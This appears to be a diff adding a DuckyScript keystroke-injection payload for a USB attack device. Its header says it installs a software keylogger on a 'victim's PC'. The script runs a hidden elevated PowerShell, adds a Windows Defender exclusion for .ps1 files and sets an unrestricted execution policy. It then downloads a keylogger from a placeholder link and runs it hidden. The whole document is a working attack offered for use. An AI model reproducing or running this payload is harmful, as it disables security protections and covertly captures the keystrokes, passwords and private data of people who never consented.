@@ -1,0 +1,44 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: This script allows you to inject a software keylogger in victim's PC
+REM Version:	1.0
+REM Category:	Exfiltration
+DELAY 2500
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell.exe -windowstyle hidden
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 5000
+LEFT
+DELAY 150
+ENTER
+DELAY 5000
+STRING cd C:\Users\Public\Documents
+ENTER
+STRING Add-MpPreference -ExclusionExtension ps1 -Force
+ENTER
+STRING Set-ExecutionPolicy unrestricted -Force
+ENTER
+STRING wget (LINK TO KEYLOGGER) -OutFile script.ps1
+ENTER
+DELAY 3500
+STRING powershell.exe -noexit -windowstyle hidden -file script.ps1
+ENTER
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 2000
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+REM End of payload
